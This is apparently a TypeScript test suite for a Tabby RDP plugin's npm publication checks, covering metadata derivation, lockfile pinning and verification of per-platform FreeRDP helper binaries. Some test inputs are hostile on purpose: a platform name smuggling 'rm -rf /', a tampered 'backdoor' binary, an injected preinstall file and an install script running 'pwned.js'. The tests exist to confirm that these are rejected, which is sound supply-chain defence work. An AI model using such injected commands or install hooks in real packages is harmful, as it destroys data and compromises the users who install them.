    const verify = (items: (readonly [string, string | Buffer])[]) =>
        checkPackage(dir, tarball(entries(items)), { revision: 'HEAD' }).problems
    assert.deepEqual(verify(contents), [])
    assert.ok(verify(contents.filter(([name]) => name !== 'npm-shrinkwrap.json')).length)
    assert.ok(verify(contents.map(([name, data]) => [name, name === 'package.json' ? committed[name] : data])).length,
        'unfiltered development metadata must fail publication')
    const altered = JSON.parse(metadata['npm-shrinkwrap.json']!.toString())
    altered.packages['node_modules/runtime'].integrity = 'sha512-different'
    assert.ok(verify(contents.map(([name, data]) => [name, name === 'npm-shrinkwrap.json' ? JSON.stringify(altered) : data])).length,
        'a changed runtime dependency must fail publication')
    assert.throws(() => runtimeMetadata(manifest, { ...lock, version: '9.9.9' }), /disagree/)
    assert.throws(() => runtimeMetadata({ ...manifest, tabbyRdp: { packageFormat: 6 } }, lock), /packageFormat/)
})

test('format 3: as format 2, and package.json publishes its test script, the only script it publishes', () => {
    const manifest = { name: 'tabby-rdp', version: '1.2.3', tabbyRdp: { packageFormat: 3 }, dependencies: { runtime: '1.0.0' },
        devDependencies: { browserTester: '2.0.0' }, scripts: { build: 'compiler', test: 'runner', postinstall: 'not for users', prepublishOnly: 'compiler' } }
    const lock = { name: manifest.name, version: manifest.version, lockfileVersion: 3,
        packages: { '': { ...manifest }, 'node_modules/runtime': { version: '1.0.0', integrity: 'sha512-runtime' },
            'node_modules/browserTester': { version: '2.0.0', dev: true } } }
    const metadata = runtimeMetadata(manifest, lock)
    assert.deepEqual(Object.keys(metadata), ['package.json'])
    const published = JSON.parse(metadata['package.json'].toString())
    assert.deepEqual([published.scripts, published.devDependencies], [{ test: 'runner' }, undefined])
    // In its place in the manifest, which is otherwise as committed.
    assert.deepEqual(Object.keys(published), Object.keys(manifest).filter(key => key !== 'devDependencies'))
    // Without a test script, none.
    const untested = { ...manifest, scripts: { build: 'compiler' } }
    assert.equal(JSON.parse(runtimeMetadata(untested, { ...lock, packages: { ...lock.packages, '': { ...untested } } })['package.json'].toString()).scripts, undefined)
    // The publish check projects it so: the package.json format 2 would publish, or the committed one, isn't this one.
    const dir = repository(BUILD, { 'package.json': JSON.stringify(manifest), 'package-lock.json': JSON.stringify(lock) })
    const contents = [...packaged().filter(([name]) => name !== 'package.json' && name !== 'README.md'), ...Object.entries(metadata), ...Object.entries(DIST)]
    const verify = (items: (readonly [string, string | Buffer])[]) => checkPackage(dir, tarball(entries(items)), { revision: 'HEAD' }).problems
    assert.deepEqual(verify(contents), [])
    const asFormat2 = JSON.parse(metadata['package.json'].toString())
    delete asFormat2.scripts
    assert.ok(verify(contents.map(([name, data]) => [name, name === 'package.json' ? JSON.stringify(asFormat2, null, 2) + '\n' : data])).length)
    assert.ok(verify(contents.map(([name, data]) => [name, name === 'package.json' ? JSON.stringify(manifest) : data])).length,
        'unfiltered scripts and development metadata must fail publication')
})

test('format 2: no shrinkwrap, package.json alone, its runtime dependencies pinned exactly and without their own', () => {
    const manifest = { name: 'tabby-rdp', version: '1.2.3', tabbyRdp: { packageFormat: 2 },
        dependencies: { runtime: '1.0.0' }, devDependencies: { browserTester: '2.0.0' }, scripts: { build: 'compiler' } }
    const lock = { name: manifest.name, version: manifest.version, lockfileVersion: 3,
        packages: { '': { ...manifest }, 'node_modules/runtime': { version: '1.0.0', integrity: 'sha512-runtime' },
            'node_modules/browserTester': { version: '2.0.0', dev: true, dependencies: { anything: '^1' } } } }
    const metadata = runtimeMetadata(manifest, lock)
    assert.deepEqual(Object.keys(metadata), ['package.json'])
    const published = JSON.parse(metadata['package.json'].toString())
    assert.deepEqual([published.dependencies, published.devDependencies, published.scripts], [{ runtime: '1.0.0' }, undefined, undefined])
    // A range floats without a lock to hold it; so does a runtime dependency's own dependency.
    const withRange = { ...manifest, dependencies: { runtime: '^1.0.0' } }
    assert.throws(() => runtimeMetadata(withRange, { ...lock, packages: { ...lock.packages, '': { ...withRange } } }), /pin it to an exact version/)
    assert.throws(() => runtimeMetadata(manifest, { ...lock, packages: { ...lock.packages, 'node_modules/runtime': { version: '1.0.0', dependencies: { other: '^2' } } } }),
        /dependencies of its own/)
    assert.throws(() => runtimeMetadata(manifest, { ...lock, packages: { ...lock.packages, 'node_modules/other': { version: '2.0.0' } } }),
        /isn't a pinned runtime dependency/)
    assert.throws(() => runtimeMetadata(manifest, { ...lock, packages: { ...lock.packages, 'node_modules/runtime': { version: '1.0.1' } } }),
        /not what the lock installs/)
    assert.throws(() => runtimeMetadata(manifest, { ...lock, version: '9.9.9' }), /lock metadata disagree/)
    // The publish check: package.json as projected, from the committed package-lock.json, and no shrinkwrap in the
    // package, which npm would install by.
    const dir = repository(BUILD, { 'package.json': JSON.stringify(manifest), 'package-lock.json': JSON.stringify(lock) })
    const contents = [...packaged().filter(([name]) => name !== 'package.json' && name !== 'README.md'), ...Object.entries(metadata), ...Object.entries(DIST)]
    const verify = (items: (readonly [string, string | Buffer])[]) => checkPackage(dir, tarball(entries(items)), { revision: 'HEAD' }).problems
    assert.deepEqual(verify(contents), [])
    assert.match(verify([...contents, ['npm-shrinkwrap.json', JSON.stringify(lock)]]).join('\n'), /npm-shrinkwrap\.json: in the package, which publishes none/)
    assert.ok(verify(contents.map(([name, data]) => [name, name === 'package.json' ? JSON.stringify(manifest) : data])).length,
        'unfiltered development metadata must fail publication')
})

/** A format 4 plugin: its manifest and lock, with the FreeRDP helper built for two platforms. */
const FORMAT_4 = {
    name: 'tabby-rdp', version: '1.2.3', repository: { type: 'git', url: 'git+https://github.com/meanaverage/tabby-rdp.git' },
    dependencies: { runtime: '1.0.0' }, devDependencies: { browserTester: '2.0.0' }, scripts: { test: 'runner' },
    tabbyRdp: { packageFormat: 4, freerdpPlatforms: ['linux-x64', 'win32-arm64'] },
}
const FORMAT_4_LOCK = { name: 'tabby-rdp', version: '1.2.3', lockfileVersion: 3,
    packages: { '': { ...FORMAT_4 }, 'node_modules/runtime': { version: '1.0.0' }, 'node_modules/browserTester': { version: '2.0.0', dev: true } } }
/** native/bin/linux-x64 as a build leaves it: the helper, a library it loads, a license and its record. */
const HELPER: Record<string, string | Buffer> = {
    'tabby-freerdp': Buffer.from('\x7fELF helper'),
    'libfreerdp3.so.3': Buffer.from('\x7fELF library'),
    'licenses/FreeRDP-LICENSE': 'Apache License\n',
    'BUILD.json': '{"files":[]}\n',
}

/** A repository with a format 4 plugin's files, tagged with its version. */
function releasedWithHelpers (): string {
    const dir = repository(BUILD, {
        'package.json': JSON.stringify(FORMAT_4), 'package-lock.json': JSON.stringify(FORMAT_4_LOCK), 'README.md': '# tabby-rdp\n',
        LICENSE: 'MIT License\n', 'native/package/README.md': "# tabby-rdp's FreeRDP helper\n",
        ...Object.fromEntries(Object.entries(HELPER).map(([file, data]) => [`native/bin/linux-x64/${file}`, data])),
    })
    git(dir, 'tag', 'v1.2.3')
    return dir
}

/** The FreeRDP package for linux-x64 as scripts/pack.mjs makes it from that repository. */
const helperPackage = (): (readonly [string, string | Buffer])[] => [
    ['package.json', freeRDPMetadata(FORMAT_4, 'linux-x64')],
    ['README.md', "# tabby-rdp's FreeRDP helper\n"],
    ['LICENSE', 'MIT License\n'],
    ...Object.entries(HELPER),
]

test('format 4: the published package.json names a FreeRDP package per platform, pinned to the plugin\'s version', () => {
    const published = JSON.parse(runtimeMetadata(FORMAT_4, FORMAT_4_LOCK)['package.json'].toString())
    assert.deepEqual(published.optionalDependencies, { '@tabby-rdp/freerdp-linux-x64': '1.2.3', '@tabby-rdp/freerdp-win32-arm64': '1.2.3' })
    // Right after the runtime dependencies; otherwise as format 3 publishes it.
    assert.deepEqual(Object.keys(published), ['name', 'version', 'repository', 'dependencies', 'optionalDependencies', 'scripts', 'tabbyRdp'])
    assert.deepEqual(published.scripts, { test: 'runner' })
    // The committed package.json names none: the lock would have to resolve packages that are published with the release.
    assert.throws(() => runtimeMetadata({ ...FORMAT_4, optionalDependencies: { other: '1.0.0' } }, FORMAT_4_LOCK), /derives them/)
    for (const freerdpPlatforms of [undefined, [], ['linux-x64', 'linux-x64'], ['darwin-x86'], ['linux-x64; rm -rf /']]) {
        assert.throws(() => runtimeMetadata({ ...FORMAT_4, tabbyRdp: { packageFormat: 4, freerdpPlatforms } }, FORMAT_4_LOCK), /freerdpPlatforms/)
    }
})

test("format 4: a FreeRDP package's package.json says which computers npm installs it on, and it is not a Tabby plugin", () => {
    const linux = JSON.parse(freeRDPMetadata(FORMAT_4, 'linux-x64').toString())
    assert.deepEqual([linux.name, linux.version, linux.os, linux.cpu, linux.libc, linux.license], [freeRDPPackage('linux-x64'), '1.2.3', ['linux'], ['x64'], ['glibc'], 'MIT AND Apache-2.0'])
    // npm's provenance check compares the repository with the one the workflow ran in.
    assert.deepEqual(linux.repository, FORMAT_4.repository)
    assert.equal(linux.keywords, undefined, 'without tabby-plugin, Tabby never loads it')
    assert.equal(linux.scripts, undefined)
    const windows = JSON.parse(freeRDPMetadata(FORMAT_4, 'win32-arm64').toString())
    assert.deepEqual([windows.os, windows.cpu, windows.libc], [['win32'], ['arm64'], undefined])
    assert.throws(() => freeRDPMetadata(FORMAT_4, 'darwin-arm64'), /not in tabbyRdp\.freerdpPlatforms/)
    // The package's own files can't come from the build's folder.
    assert.throws(() => freeRDPFiles('linux-x64', ['tabby-freerdp', 'readme.md']), /keeps for its own/)
    assert.throws(() => freeRDPFiles('linux-x64', ['package.json']), /keeps for its own/)
})

test("format 4: the publish check passes a FreeRDP package of the tag's build, and fails anything else in it", () => {
    const dir = releasedWithHelpers()
    const check = (files: (readonly [string, string | Buffer])[]) => checkPackage(dir, tarball(entries(files))).problems
    assert.deepEqual(checkPackage(dir, tarball(entries(helperPackage()))), {
        problems: [], revision: 'v1.2.3', commit: git(dir, 'rev-parse', 'v1.2.3').trim(), version: '1.2.3', files: 7, vendor: 0, built: 0, platform: 'linux-x64',
    })
    assert.deepEqual(check(helperPackage().map(([file, data]) => [file, file === 'tabby-freerdp' ? '\x7fELF backdoor' : data])),
        ['tabby-freerdp: not as native/bin/linux-x64/tabby-freerdp in v1.2.3'])
    assert.deepEqual(check([...helperPackage(), ['preinstall.js', 'pwned()\n']]), ["preinstall.js: not in v1.2.3's package for linux-x64"])
    assert.deepEqual(check(helperPackage().filter(([file]) => file !== 'libfreerdp3.so.3')), ['libfreerdp3.so.3: missing from the package'])
    // package.json as derived, not another one: install scripts, or other computers to install on.
    const scripted = { ...JSON.parse(freeRDPMetadata(FORMAT_4, 'linux-x64').toString()), scripts: { install: 'node pwned.js' } }
    assert.deepEqual(check(helperPackage().map(([file, data]) => [file, file === 'package.json' ? JSON.stringify(scripted, null, 2) + '\n' : data])),
        ['package.json: not as derived from v1.2.3'])
    // A platform the tag doesn't publish (none built), or doesn't name.
    const windows = [['package.json', freeRDPMetadata(FORMAT_4, 'win32-arm64')] as const, ...helperPackage().filter(([file]) => file !== 'package.json')]
    assert.deepEqual(check(windows), ['tabby-freerdp: not in v1.2.3\'s package for win32-arm64', 'libfreerdp3.so.3: not in v1.2.3\'s package for win32-arm64',
        'licenses/FreeRDP-LICENSE: not in v1.2.3\'s package for win32-arm64', 'BUILD.json: not in v1.2.3\'s package for win32-arm64'])
    const unnamed = JSON.stringify({ ...JSON.parse(freeRDPMetadata(FORMAT_4, 'linux-x64').toString()), name: '@tabby-rdp/freerdp-darwin-arm64' })
    assert.match(check(helperPackage().map(([file, data]) => [file, file === 'package.json' ? unnamed : data])).join('\n'), /darwin-arm64 is not in tabbyRdp\.freerdpPlatforms/)
})

test("format 4: the plugin's package holds no native code, and a revision before format 4 publishes no FreeRDP package", () => {
    const dir = releasedWithHelpers()
    const plugin = [...packaged().filter(([file]) => file !== 'package.json'), ['LICENSE', 'MIT License\n'] as const,
        ...Object.entries(runtimeMetadata(FORMAT_4, FORMAT_4_LOCK)), ...Object.entries(DIST)]
    assert.deepEqual(checkPackage(dir, tarball(entries(plugin))).problems, [])
    assert.deepEqual(checkPackage(dir, tarball(entries([...plugin, ['native/bin/linux-x64/tabby-freerdp', HELPER['tabby-freerdp']]]))).problems,
        ['native/bin/linux-x64/tabby-freerdp: in the plugin\'s package, where format 4 publishes no native code (it is in its platform\'s FreeRDP package)'])
    const old = released()
    assert.match(checkPackage(old, tarball(entries(helperPackage()))).problems.join('\n'), /a FreeRDP package, which v1\.2\.3 doesn't publish/)
})

test('format 5: the plugin carries only the seven executable network helpers verified by an independent build', () => {
    const manifest = { ...FORMAT_4, tabbyRdp: { ...FORMAT_4.tabbyRdp, packageFormat: 5 } }
    const lock = { ...FORMAT_4_LOCK, packages: { ...FORMAT_4_LOCK.packages, '': { ...FORMAT_4_LOCK.packages[''], tabbyRdp: manifest.tabbyRdp } } }
    const dir = repository(BUILD, { 'package.json': JSON.stringify(manifest), 'package-lock.json': JSON.stringify(lock) })
    const metadata = runtimeMetadata(manifest, lock)
    const helpers = Object.fromEntries(TARGETS.map(target => [helperFile(target), `helper for ${target.platform}-${target.arch}\n`]))
    const sums = `# built\n${Object.entries(helpers).map(([file, data]) => `${sha256(Buffer.from(data))}  ${file}`).join('\n')}\n`
    const contents = [...packaged().filter(([file]) => file !== 'package.json' && file !== 'README.md'), ...Object.entries(metadata), ...Object.entries(DIST)]
    const pack = (bin: Record<string, string>, executable = true) => tarball([...entries(contents),
        ...Object.entries(bin).map(([file, data]) => ({ path: `package/${file}`, data,
            mode: file === SUMS || file.endsWith('.exe') || !executable ? '0000644' : '0000755' }))])
    const good = { ...helpers, [SUMS]: sums }
    assert.deepEqual(checkPackage(dir, pack(good), { revision: 'HEAD', helpersSha256: sha256(Buffer.from(sums)) }).problems, [])
    const first = helperFile(TARGETS[0])
    const { [first]: _missing, ...withoutOne } = good
    assert.match(checkPackage(dir, pack(withoutOne), { revision: 'HEAD' }).problems.join('\n'), /missing from the package/)
    assert.match(checkPackage(dir, pack({ ...good, [first]: 'changed' }), { revision: 'HEAD' }).problems.join('\n'), /not what bin\/SHA256SUMS records/)
    assert.match(checkPackage(dir, pack(good, false), { revision: 'HEAD' }).problems.join('\n'), /not executable/)
    assert.match(checkPackage(dir, pack({ ...good, 'bin/other': 'x' }), { revision: 'HEAD' }).problems.join('\n'), /unexpected file in bin/)
    assert.match(checkPackage(dir, pack(good), { revision: 'HEAD', helpersSha256: '0'.repeat(64) }).problems.join('\n'), /differs from an independent helper build/)
})
